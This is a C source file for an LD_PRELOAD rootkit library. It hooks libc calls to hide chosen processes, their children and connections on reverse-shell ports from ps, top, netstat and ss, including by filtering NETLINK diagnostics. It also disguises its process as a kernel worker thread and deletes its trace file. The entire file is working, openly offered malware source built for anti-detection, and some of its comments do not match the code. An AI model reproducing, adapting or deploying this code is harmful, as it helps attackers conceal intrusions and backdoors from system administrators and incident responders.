/*
 * LD_PRELOAD Hiding Library (libldr.so)
 * =======================================
 *
 * Hooks libc functions to hide:
 *   1. Our process from /proc listings (ps, top, htop, ls /proc)
 *   2. Our network connections from /proc/net/tcp* (netstat, ss)
 *   3. Our library from /proc/<pid>/maps
 *
 * ALL hooks have a /proc/ path whitelist:
 *   - Path doesn't contain "/proc/" → pass through immediately
 *   - Path contains "/proc/" → check if it's a hidden PID → filter
 *
 * This ensures system services and non-proc file access are unaffected.
 *
 * Usage:
 *   LD_PRELOAD=./libldr.so <command>
 *
 * Anti-detection:
 *   - Uses RTLD_NEXT for clean hooking
 *   - Path whitelist minimizes performance impact
 *   - Filters /proc/net/tcp by port number (for ss/netstat compatibility)
 *   - NETLINK SOCK_DIAG filtering for modern ss
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdarg.h>
#include <ctype.h>
#include <pthread.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/prctl.h>
#include <linux/netlink.h>
#include <linux/inet_diag.h>
#include <linux/sock_diag.h>

/* =========================================================================
 * Globals: Track what we need to hide
 * ========================================================================= */
static pid_t   my_pid       = 0;
static char    my_comm[256] = {0};
static int     initialized  = 0;
static pthread_mutex_t init_lock = PTHREAD_MUTEX_INITIALIZER;

/* Hidden PIDs */
#define MAX_HIDDEN_PIDS 32
static pid_t  hidden_pids[MAX_HIDDEN_PIDS];
static int    hidden_pid_count = 0;

/* Hidden ports: connections involving these ports are filtered */
#define MAX_HIDDEN_PORTS 16
static unsigned short hidden_ports[MAX_HIDDEN_PORTS];
static int hidden_port_count = 0;

/* Socket inodes we own */
#define MAX_SOCK_INODES 16
static unsigned long sock_inodes[MAX_SOCK_INODES];
static int sock_inode_count = 0;

/* =========================================================================
 * Real libc function pointers
 * ========================================================================= */
static DIR *(*real_opendir)(const char *name) = NULL;
static struct dirent *(*real_readdir)(DIR *dirp) = NULL;
static struct dirent64 *(*real_readdir64)(DIR *dirp) = NULL;
static FILE *(*real_fopen)(const char *path, const char *mode) = NULL;
static FILE *(*real_fopen64)(const char *path, const char *mode) = NULL;
static int (*real_open)(const char *path, int flags, ...) = NULL;
static int (*real_open64)(const char *path, int flags, ...) = NULL;
static int (*real_openat)(int dirfd, const char *path, int flags, ...) = NULL;
static int (*real_openat64)(int dirfd, const char *path, int flags, ...) = NULL;
static ssize_t (*real_read)(int fd, void *buf, size_t count) = NULL;
static int (*real___xstat)(int ver, const char *path, struct stat *sb) = NULL;
static int (*real___xstat64)(int ver, const char *path, struct stat64 *sb) = NULL;
static int (*real_fstatat)(int dirfd, const char *path, struct stat *buf, int flags) = NULL;

/* NETLINK hooks */
static int      (*real_socket)(int, int, int) = NULL;
static ssize_t  (*real_recvmsg)(int, struct msghdr *, int) = NULL;
static ssize_t  (*real_sendmsg)(int, const struct msghdr *, int) = NULL;
static ssize_t  (*real_recvfrom)(int, void *, size_t, int, struct sockaddr *, socklen_t *) = NULL;
static ssize_t  (*real_recv)(int, void *, size_t, int) = NULL;

/* NL fd tracking */
#define NL_FD_BITSET_SIZE 32
static unsigned int nl_fd_set[NL_FD_BITSET_SIZE];
static inline void mark_nl_fd(int fd) { if (fd >= 0 && fd < 1024) nl_fd_set[fd/32] |= (1u << (fd % 32)); }
static inline int  is_nl_fd(int fd)   { if (fd < 0 || fd >= 1024) return 0; return !!(nl_fd_set[fd/32] & (1u << (fd % 32))); }

/* =========================================================================
 * Path whitelist: only filter /proc/ paths
 * ========================================================================= */
static inline int is_proc_path(const char *path) {
    if (!path) return 0;
    return (strstr(path, "/proc/") != NULL);
}

/* Check if path refers to any hidden process */
static int is_hidden_proc_path(const char *path) {
    if (!path) return 0;
    for (int i = 0; i < hidden_pid_count; i++) {
        if (hidden_pids[i] <= 1) continue;
        char pattern[64];
        snprintf(pattern, sizeof(pattern), "/proc/%d", hidden_pids[i]);
        if (strstr(path, pattern)) return 1;
    }
    return 0;
}

/* Check if path is /proc/net/tcp or /proc/net/tcp6 */
static inline int is_proc_net_tcp_path(const char *path) {
    if (!path) return 0;
    return (strstr(path, "/proc/net/tcp") != NULL);
}

/* =========================================================================
 * Initialize
 * ========================================================================= */

/* Scan our socket inodes from /proc/self/net/tcp */
static void scan_own_sockets(void) {
    /* Collect inodes for all our TCP sockets */
    const char *paths[] = {
        "/proc/self/net/tcp",
        "/proc/self/net/tcp6",
        NULL
    };

    for (int i = 0; paths[i] && sock_inode_count < MAX_SOCK_INODES; i++) {
        FILE *f = real_fopen(paths[i], "r");
        if (!f) continue;

        char line[256];
        fgets(line, sizeof(line), f); /* skip header */

        while (fgets(line, sizeof(line), f) && sock_inode_count < MAX_SOCK_INODES) {
            /* Parse: find the inode field (last numeric field) */
            char *p = line + strlen(line) - 1;
            while (p > line && isspace(*p)) p--;
            while (p > line && !isspace(*p)) p--;
            unsigned long inode = strtoul(p, NULL, 10);
            if (inode > 0) {
                /* Check for duplicates */
                int dup = 0;
                for (int j = 0; j < sock_inode_count; j++)
                    if (sock_inodes[j] == inode) dup = 1;
                if (!dup)
                    sock_inodes[sock_inode_count++] = inode;
            }
        }
        fclose(f);
    }
}

/* Add a hidden PID (with duplicate check) */
static void add_hidden_pid(pid_t pid) {
    if (pid <= 1) return;
    if (hidden_pid_count >= MAX_HIDDEN_PIDS) return;
    for (int i = 0; i < hidden_pid_count; i++)
        if (hidden_pids[i] == pid) return;
    hidden_pids[hidden_pid_count++] = pid;
}

/* Scan for all PIDs with sockets on hidden ports */
static void scan_hidden_pids(void) {
    /* Always hide ourselves */
    add_hidden_pid(my_pid);

    /* Method 1: Read target PID from environment */
    const char *env_pid = getenv("_HIDE_PID");
    if (env_pid) {
        pid_t target = (pid_t)atoi(env_pid);
        if (target > 1) add_hidden_pid(target);
    }

    /* Method 2: Read target PID from file */
    {
        FILE *hf = real_fopen("/tmp/.h", "r");
        if (hf) {
            char buf[64];
            if (fgets(buf, sizeof(buf), hf)) {
                pid_t t = (pid_t)atoi(buf);
                if (t > 1) add_hidden_pid(t);
            }
            fclose(hf);
        }
    }

    /* Method 3: Scan /proc/net/tcp for connections on hidden ports.
     * Find the PIDs owning those connections and hide them too. */
    if (hidden_port_count > 0 && hidden_pid_count < MAX_HIDDEN_PIDS) {
        FILE *tcp = real_fopen("/proc/net/tcp", "r");
        if (tcp) {
            char line[256];
            fgets(line, sizeof(line), tcp); /* skip header */

            while (fgets(line, sizeof(line), tcp) && hidden_pid_count < MAX_HIDDEN_PIDS) {
                /* Check each hidden port */
                for (int pi = 0; pi < hidden_port_count; pi++) {
                    char port_hex[8];
                    /* Port in /proc/net/tcp is network byte order hex */
                    unsigned short netport = htons(hidden_ports[pi]);
                    snprintf(port_hex, sizeof(port_hex), ":%04X", netport);

                    if (strstr(line, port_hex)) {
                        /* Extract inode */
                        char *p = line + strlen(line) - 1;
                        while (p > line && isspace(*p)) p--;
                        while (p > line && !isspace(*p)) p--;
                        unsigned long inode = strtoul(p, NULL, 10);
                        if (inode == 0) continue;

                        /* Find PID owning this inode */
                        DIR *pc = real_opendir("/proc");
                        if (!pc) continue;

                        struct dirent *ce;
                        while ((ce = real_readdir(pc)) && hidden_pid_count < MAX_HIDDEN_PIDS) {
                            pid_t cpid = atoi(ce->d_name);
                            if (cpid <= 1) continue;

                            char fd_dir[64];
                            snprintf(fd_dir, sizeof(fd_dir), "/proc/%d/fd", cpid);
                            DIR *fd_d = real_opendir(fd_dir);
                            if (!fd_d) continue;

                            struct dirent *fe;
                            while ((fe = real_readdir(fd_d))) {
                                char lpath[128], link[256];
                                snprintf(lpath, sizeof(lpath), "/proc/%d/fd/%s", cpid, fe->d_name);
                                ssize_t n = readlink(lpath, link, sizeof(link)-1);
                                if (n > 0) {
                                    link[n] = '\0';
                                    char inode_str[32];
                                    snprintf(inode_str, sizeof(inode_str), "socket:[%lu]", inode);
                                    if (strstr(link, inode_str)) {
                                        add_hidden_pid(cpid);
                                        break;
                                    }
                                }
                            }
                            closedir(fd_d);
                        }
                        closedir(pc);
                        break; /* Found the port, move to next line */
                    }
                }
            }
            fclose(tcp);
        }
    }

    /* Method 4: Hide child processes of hidden PIDs */
    if (hidden_pid_count < MAX_HIDDEN_PIDS) {
        int base_count = hidden_pid_count;
        DIR *pc = real_opendir("/proc");
        if (pc) {
            struct dirent *ce;
            while ((ce = real_readdir(pc)) && hidden_pid_count < MAX_HIDDEN_PIDS) {
                pid_t cpid = atoi(ce->d_name);
                if (cpid <= 1) continue;
                char stat_path[64];
                snprintf(stat_path, sizeof(stat_path), "/proc/%d/stat", cpid);
                FILE *st = real_fopen(stat_path, "r");
                if (st) {
                    int ppid = 0;
                    fscanf(st, "%*d %*s %*c %d", &ppid);
                    fclose(st);
                    for (int i = 0; i < base_count; i++) {
                        if (ppid == hidden_pids[i]) {
                            add_hidden_pid(cpid);
                            break;
                        }
                    }
                }
            }
            closedir(pc);
        }
    }
}

/* Re-entry guard */
static int in_init = 0;


/* Safe symbol resolution for glibc 2.40+ — RTLD_NEXT is broken in LD_PRELOAD */
static void *safe_dlsym(const char *name) {
    void *sym = dlsym(RTLD_DEFAULT, name);
    /* If RTLD_DEFAULT returns our own hook, try RTLD_NEXT */
    if (!sym) {
        sym = dlsym(RTLD_NEXT, name);
    }
    return sym;
}

static void resolve_libc_functions(void) {
    if (!real_opendir)    real_opendir    = safe_dlsym("opendir");
    if (!real_readdir)    real_readdir    = safe_dlsym("readdir");
    if (!real_readdir64)  real_readdir64  = safe_dlsym("readdir64");
    if (!real_fopen)      real_fopen      = safe_dlsym("fopen");
    if (!real_fopen64)    real_fopen64    = safe_dlsym("fopen64");
    if (!real_open)       real_open       = safe_dlsym("open");
    if (!real_open64)     real_open64     = safe_dlsym("open64");
    if (!real_openat)     real_openat     = safe_dlsym("openat");
    if (!real_openat64)   real_openat64   = safe_dlsym("openat64");
    if (!real_read)       real_read       = safe_dlsym("read");
    if (!real___xstat)    real___xstat    = safe_dlsym("__xstat");
    if (!real___xstat64)  real___xstat64  = safe_dlsym("__xstat64");
    if (!real_fstatat)    real_fstatat    = safe_dlsym("fstatat");
    if (!real_socket)     real_socket     = safe_dlsym("socket");
    if (!real_recvmsg)    real_recvmsg    = safe_dlsym("recvmsg");
    if (!real_sendmsg)    real_sendmsg    = safe_dlsym("sendmsg");
    if (!real_recvfrom)   real_recvfrom   = safe_dlsym("recvfrom");
    if (!real_recv)       real_recv       = safe_dlsym("recv");
}

static void do_init(void) {
    if (initialized) return;
    if (in_init) return;
    in_init = 1;

    pthread_mutex_lock(&init_lock);
    if (initialized) { pthread_mutex_unlock(&init_lock); in_init = 0; return; }

    /* Step 1: Resolve ALL libc functions FIRST */
    resolve_libc_functions();

    /* Step 2: Get our own PID */
    my_pid = getpid();

    /* Clean up the .so file from disk — it's already loaded into memory */
    unlink("/tmp/.h");

    /* Spoof process name — pure syscalls, no libc dependency */
    {
        const char *name = "[kworker/0:0]";
        syscall(157 /*PR_SET_NAME*/, (unsigned long)name, 0UL, 0UL, 0UL);
        int fd = (int)syscall(257 /*openat*/, -100 /*AT_FDCWD*/,
                              "/proc/self/comm", 1 /*O_WRONLY*/, 0);
        if (fd >= 0) {
            syscall(1 /*write*/, fd, name, 14UL);
            syscall(3 /*close*/, fd);
        }
    }

    /* Read process name */
    if (real_fopen) {
        FILE *f = real_fopen("/proc/self/comm", "r");
        if (f) {
            if (fgets(my_comm, sizeof(my_comm), f))
                my_comm[strcspn(my_comm, "\n")] = 0;
            fclose(f);
        }
    }

    /* Set default hidden ports (will be checked against /proc/net/tcp) */
    /* Common reverse shell ports */
    unsigned short default_ports[] = {4444, 443, 8080, 5555, 1337};
    for (int i = 0; i < 5 && hidden_port_count < MAX_HIDDEN_PORTS; i++)
        hidden_ports[hidden_port_count++] = default_ports[i];

    /* Also check environment for custom port */
    const char *env_port = getenv("_HIDE_PORT");
    if (env_port) {
        unsigned short p = (unsigned short)atoi(env_port);
        if (p > 0) {
            int dup = 0;
            for (int i = 0; i < hidden_port_count; i++)
                if (hidden_ports[i] == p) dup = 1;
            if (!dup && hidden_port_count < MAX_HIDDEN_PORTS)
                hidden_ports[hidden_port_count++] = p;
        }
    }

    /* Scan our network socket inodes */
    scan_own_sockets();

    /* Find all PIDs with hidden connections */
    scan_hidden_pids();

    initialized = 1;
    pthread_mutex_unlock(&init_lock);
    in_init = 0;
}

__attribute__((constructor(65535)))
static void libhide_init(void) {
    /* Do NOTHING in constructor — all init deferred to first hook call */
    initialized = 0;
    in_init = 0;
}

/* =========================================================================
 * Hook: opendir — pass-through (filtering done in readdir)
 * ========================================================================= */
__attribute__((visibility("default"))) DIR *opendir(const char *name) {
    if (!initialized) do_init();
    if (!real_opendir) { resolve_libc_functions(); real_opendir = safe_dlsym("opendir"); }
    return real_opendir(name);
}

/* =========================================================================
 * Hook: readdir — filter /proc/<pid> entries for hidden PIDs
 * ========================================================================= */
struct dirent *readdir(DIR *dirp) {
    if (!initialized) do_init();
    if (!real_readdir) { resolve_libc_functions(); real_readdir = safe_dlsym("readdir"); }

    struct dirent *entry;
    while ((entry = real_readdir(dirp)) != NULL) {
        /* Only filter numeric entries (PIDs in /proc) */
        int is_pid = 1;
        for (char *c = entry->d_name; *c; c++) {
            if (!isdigit(*c)) { is_pid = 0; break; }
        }
        if (is_pid) {
            pid_t pid = (pid_t)atoi(entry->d_name);
            int skip = 0;
            for (int i = 0; i < hidden_pid_count; i++) {
                if (pid == hidden_pids[i]) { skip = 1; break; }
            }
            if (skip) continue; /* Skip hidden PID */
        }
        return entry;
    }
    return NULL;
}

/* =========================================================================
 * Hook: readdir64 — same filtering for 64-bit dirent
 * ========================================================================= */
struct dirent64 *readdir64(DIR *dirp) {
    if (!initialized) do_init();
    if (!real_readdir64) { resolve_libc_functions(); real_readdir64 = safe_dlsym("readdir64"); }

    struct dirent64 *entry;
    while ((entry = real_readdir64(dirp)) != NULL) {
        int is_pid = 1;
        for (char *c = entry->d_name; *c; c++) {
            if (!isdigit(*c)) { is_pid = 0; break; }
        }
        if (is_pid) {
            pid_t pid = (pid_t)atoi(entry->d_name);
            int skip = 0;
            for (int i = 0; i < hidden_pid_count; i++) {
                if (pid == hidden_pids[i]) { skip = 1; break; }
            }
            if (skip) continue;
        }
        return entry;
    }
    return NULL;
}

/* =========================================================================
 * Hook: fopen / fopen64
 * PATH WHITELIST: only filter if path contains "/proc/"
 * ========================================================================= */
__attribute__((visibility("default"))) FILE *fopen(const char *pathname, const char *mode) {
    if (!initialized) do_init();
    if (!real_fopen) { resolve_libc_functions(); real_fopen = safe_dlsym("fopen"); }

    /* WHITELIST: only filter /proc/ paths */
    if (pathname && is_proc_path(pathname)) {
        if (is_hidden_proc_path(pathname)) {
            errno = ENOENT;
            return NULL;
        }
    }

    return real_fopen(pathname, mode);
}

__attribute__((visibility("default"))) FILE *fopen64(const char *pathname, const char *mode) {
    if (!initialized) do_init();
    if (!real_fopen64) { resolve_libc_functions(); real_fopen64 = safe_dlsym("fopen64"); }

    if (pathname && is_proc_path(pathname)) {
        if (is_hidden_proc_path(pathname)) {
            errno = ENOENT;
            return NULL;
        }
    }

    return real_fopen64(pathname, mode);
}

/* =========================================================================
 * Hook: open / open64
 * PATH WHITELIST: only filter if path contains "/proc/"
 * ========================================================================= */
__attribute__((visibility("default"))) int open(const char *pathname, int flags, ...) {
    if (!initialized) do_init();
    if (!real_open) { resolve_libc_functions(); real_open = safe_dlsym("open"); }

    if (pathname && is_proc_path(pathname)) {
        if (is_hidden_proc_path(pathname)) {
            errno = ENOENT;
            return -1;
        }
    }

    if (flags & O_CREAT) {
        va_list ap;
        va_start(ap, flags);
        mode_t mode = va_arg(ap, mode_t);
        va_end(ap);
        return real_open(pathname, flags, mode);
    }
    return real_open(pathname, flags);
}

__attribute__((visibility("default"))) int open64(const char *pathname, int flags, ...) {
    if (!initialized) do_init();
    if (!real_open64) { resolve_libc_functions(); real_open64 = safe_dlsym("open64"); }

    if (pathname && is_proc_path(pathname)) {
        if (is_hidden_proc_path(pathname)) {
            errno = ENOENT;
            return -1;
        }
    }

    if (flags & O_CREAT) {
        va_list ap;
        va_start(ap, flags);
        mode_t mode = va_arg(ap, mode_t);
        va_end(ap);
        return real_open64(pathname, flags, mode);
    }
    return real_open64(pathname, flags);
}

/* =========================================================================
 * Hook: openat / openat64
 * PATH WHITELIST: only filter if path contains "/proc/"
 * Critical: ps/top use openat()
 * ========================================================================= */
__attribute__((visibility("default"))) int openat(int dirfd, const char *pathname, int flags, ...) {
    if (!initialized && !in_init) do_init();
    if (!real_openat) { resolve_libc_functions(); real_openat = safe_dlsym("openat"); }

    if (pathname && is_proc_path(pathname)) {
        if (is_hidden_proc_path(pathname)) {
            errno = ENOENT;
            return -1;
        }
    }

    if (flags & O_CREAT) {
        va_list ap;
        va_start(ap, flags);
        mode_t mode = va_arg(ap, mode_t);
        va_end(ap);
        return real_openat(dirfd, pathname, flags, mode);
    }
    return real_openat(dirfd, pathname, flags);
}

__attribute__((visibility("default"))) int openat64(int dirfd, const char *pathname, int flags, ...) {
    if (!initialized && !in_init) do_init();
    if (!real_openat64) { resolve_libc_functions(); real_openat64 = safe_dlsym("openat64"); }

    if (pathname && is_proc_path(pathname)) {
        if (is_hidden_proc_path(pathname)) {
            errno = ENOENT;
            return -1;
        }
    }

    if (flags & O_CREAT) {
        va_list ap;
        va_start(ap, flags);
        mode_t mode = va_arg(ap, mode_t);
        va_end(ap);
        return real_openat64(dirfd, pathname, flags, mode);
    }
    return real_openat64(dirfd, pathname, flags);
}

/* =========================================================================
 * Hook: __xstat / __xstat64
 * PATH WHITELIST: only filter /proc/ paths
 * ========================================================================= */
__attribute__((visibility("default"))) int __xstat(int ver, const char *path, struct stat *buf) {
    if (!initialized) do_init();
    if (!real___xstat) { resolve_libc_functions(); real___xstat = safe_dlsym("__xstat"); }

    if (path && is_proc_path(path)) {
        if (is_hidden_proc_path(path)) {
            errno = ENOENT;
            return -1;
        }
    }
    return real___xstat(ver, path, buf);
}

__attribute__((visibility("default"))) int __xstat64(int ver, const char *path, struct stat64 *buf) {
    if (!initialized) do_init();
    if (!real___xstat64) { resolve_libc_functions(); real___xstat64 = safe_dlsym("__xstat64"); }

    if (path && is_proc_path(path)) {
        if (is_hidden_proc_path(path)) {
            errno = ENOENT;
            return -1;
        }
    }
    return real___xstat64(ver, path, buf);
}

__attribute__((visibility("default"))) int fstatat(int dirfd, const char *path, struct stat *buf, int flags) {
    if (!initialized && !in_init) do_init();
    if (!real_fstatat) { resolve_libc_functions(); real_fstatat = safe_dlsym("fstatat"); }

    if (path && is_proc_path(path)) {
        if (is_hidden_proc_path(path)) {
            errno = ENOENT;
            return -1;
        }
    }
    return real_fstatat(dirfd, path, buf, flags);
}

/* =========================================================================
 * Hook: read — Filter /proc/net/tcp* content
 *
 * Detects reads from /proc/net/tcp and filters lines matching:
 *   1. Our socket inodes
 *   2. Hidden port numbers
 * ========================================================================= */

/* Check if an fd points to /proc/net/tcp */
static int is_proc_net_fd(int fd) {
    if (fd < 3 || fd > 1023) return 0;

    char linkpath[64], target[256];
    snprintf(linkpath, sizeof(linkpath), "/proc/self/fd/%d", fd);
    ssize_t n = readlink(linkpath, target, sizeof(target) - 1);
    if (n <= 0) return 0;
    target[n] = '\0';

    if (strstr(target, "/proc/net/tcp") || strstr(target, "/proc/self/net/tcp"))
        return 1;
    return 0;
}

/* Check if a /proc/net/tcp line should be hidden */
static int line_should_hide(const char *line) {
    /* Check by inode */
    const char *p = line + strlen(line);
    while (p > line && isspace(*(p-1))) p--;
    const char *end = p;
    while (p > line && !isspace(*(p-1))) p--;
    if (p < end) {
        unsigned long inode = strtoul(p, NULL, 10);
        for (int i = 0; i < sock_inode_count; i++) {
            if (inode == sock_inodes[i]) return 1;
        }
    }

    /* Check by port number */
    for (int i = 0; i < hidden_port_count; i++) {
        char port_hex[8];
        unsigned short netport = htons(hidden_ports[i]);
        snprintf(port_hex, sizeof(port_hex), ":%04X", netport);
        if (strstr(line, port_hex)) return 1;
    }

    return 0;
}

__attribute__((visibility("default"))) ssize_t read(int fd, void *buf, size_t count) {
    if (!initialized) do_init();
    if (!real_read) { resolve_libc_functions(); real_read = safe_dlsym("read"); }

    /* Only filter /proc/net/tcp reads */
    if (!is_proc_net_fd(fd)) {
        return real_read(fd, buf, count);
    }

    ssize_t n = real_read(fd, buf, count);
    if (n <= 0) return n;

    /* Filter lines matching hidden ports/inodes */
    char *line = (char *)buf;
    char *buf_end = (char *)buf + n;
    while (line < buf_end) {
        char *eol = memchr(line, '\n', buf_end - line);
        if (!eol) break;

        size_t line_len = eol - line;
        if (line_should_hide(line)) {
            /* Replace line with spaces, keep newline */
            memset(line, ' ', line_len);
        }
        line = eol + 1;
    }

    return n;
}

/* =========================================================================
 * NETLINK hooks: intercept ss (SOCK_DIAG)
 * ========================================================================= */

/* socket hook: track NETLINK fds */
__attribute__((visibility("default"))) int socket(int domain, int type, int protocol) {
    if (!initialized && !in_init) do_init();
    if (!real_socket) { resolve_libc_functions(); real_socket = safe_dlsym("socket"); }

    int fd = real_socket(domain, type, protocol);
    if (fd >= 0 && domain == AF_NETLINK) {
        mark_nl_fd(fd);
    }
    return fd;
}

/* Filter NETLINK SOCK_DIAG responses to hide connections */
static void filter_netlink_response(struct msghdr *msg) {
    if (!msg->msg_iov || msg->msg_iovlen == 0) return;

    char *buf = (char *)msg->msg_iov[0].iov_base;
    size_t len = msg->msg_iov[0].iov_len;

    while (len >= NLMSG_HDRLEN) {
        struct nlmsghdr *nlh = (struct nlmsghdr *)buf;

        if (nlh->nlmsg_len < NLMSG_HDRLEN || nlh->nlmsg_len > len)
            break;

        /* SOCK_DIAG_BY_FAMILY = 20 (TCP), 21 = DCCP */
        if ((nlh->nlmsg_type == 20 || nlh->nlmsg_type == 21) &&
            nlh->nlmsg_len >= NLMSG_HDRLEN + (int)sizeof(struct inet_diag_msg)) {

            struct inet_diag_msg *diag =
                (struct inet_diag_msg *)(nlh + 1);

            /* Match by port */
            uint16_t sport = ntohs(diag->id.idiag_sport);
            uint16_t dport = ntohs(diag->id.idiag_dport);

            int hide = 0;
            for (int i = 0; i < hidden_port_count; i++) {
                if (sport == hidden_ports[i] || dport == hidden_ports[i]) {
                    hide = 1;
                    break;
                }
            }

            /* Also check by inode */
            if (!hide) {
                for (int i = 0; i < sock_inode_count; i++) {
                    if (diag->idiag_inode == sock_inodes[i]) {
                        hide = 1;
                        break;
                    }
                }
            }

            if (hide) {
                /* Zero out → ss shows 0.0.0.0:0 */
                memset(diag, 0, nlh->nlmsg_len - NLMSG_HDRLEN);
            }
        }

        size_t advance = NLMSG_ALIGN(nlh->nlmsg_len);
        if (advance >= len) break;
        buf  += advance;
        len  -= advance;
    }
}

__attribute__((visibility("default"))) ssize_t recvmsg(int sockfd, struct msghdr *msg, int flags) {
    if (!initialized && !in_init) do_init();
    if (!real_recvmsg) { resolve_libc_functions(); real_recvmsg = safe_dlsym("recvmsg"); }

    ssize_t ret = real_recvmsg(sockfd, msg, flags);
    if (ret > 0 && is_nl_fd(sockfd)) {
        filter_netlink_response(msg);
    }
    return ret;
}

__attribute__((visibility("default"))) ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags,
                 struct sockaddr *src_addr, socklen_t *addrlen) {
    if (!initialized && !in_init) do_init();
    if (!real_recvfrom) { resolve_libc_functions(); real_recvfrom = safe_dlsym("recvfrom"); }

    ssize_t ret = real_recvfrom(sockfd, buf, len, flags, src_addr, addrlen);
    if (ret > 0 && is_nl_fd(sockfd) && buf) {
        struct iovec iov = { .iov_base = buf, .iov_len = (size_t)ret };
        struct msghdr mh = { .msg_iov = &iov, .msg_iovlen = 1 };
        filter_netlink_response(&mh);
    }
    return ret;
}

__attribute__((visibility("default"))) ssize_t sendmsg(int sockfd, const struct msghdr *msg, int flags) {
    if (!initialized && !in_init) do_init();
    if (!real_sendmsg) { resolve_libc_functions(); real_sendmsg = safe_dlsym("sendmsg"); }
    return real_sendmsg(sockfd, msg, flags);
}

__attribute__((visibility("default"))) ssize_t recv(int sockfd, void *buf, size_t len, int flags) {
    if (!initialized && !in_init) do_init();
    if (!real_recv) { resolve_libc_functions(); real_recv = safe_dlsym("recv"); }

    ssize_t ret = real_recv(sockfd, buf, len, flags);
    if (ret > 0 && is_nl_fd(sockfd) && buf) {
        struct iovec iov = { .iov_base = buf, .iov_len = (size_t)ret };
        struct msghdr mh = { .msg_iov = &iov, .msg_iovlen = 1 };
        filter_netlink_response(&mh);
    }
    return ret;
}
